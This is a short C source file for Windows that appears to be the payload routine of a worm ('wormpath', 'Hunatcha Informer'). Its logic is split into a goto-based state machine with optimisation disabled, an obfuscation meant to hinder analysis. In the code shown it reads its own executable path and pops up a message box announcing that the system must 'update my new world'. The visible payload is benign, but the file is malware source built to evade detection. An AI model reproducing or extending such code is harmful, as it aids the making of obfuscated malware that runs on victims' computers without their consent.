#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>

void _Payload(void)
{
    char wormpath[MAX_PATH];
    char msg[MAX_PATH];
    volatile int state = 1;

dispatcher:
    if (state == 1) goto state1;
    if (state == 2) goto state2;
    if (state == 3) goto state3;
    if (state == 0) goto end;

state1:
    GetModuleFileNameA(NULL, wormpath, MAX_PATH);
    state = 2;
    goto dispatcher;

state2:
    strcpy(msg, "Your system need to update my new world...");
    state = 3;
    goto dispatcher;

state3:
    MessageBoxA(NULL, msg, "Hunatcha Informer", MB_ICONINFORMATION);
    state = 0;
    goto dispatcher;

end:
    return;
}
#pragma optimize("", on)
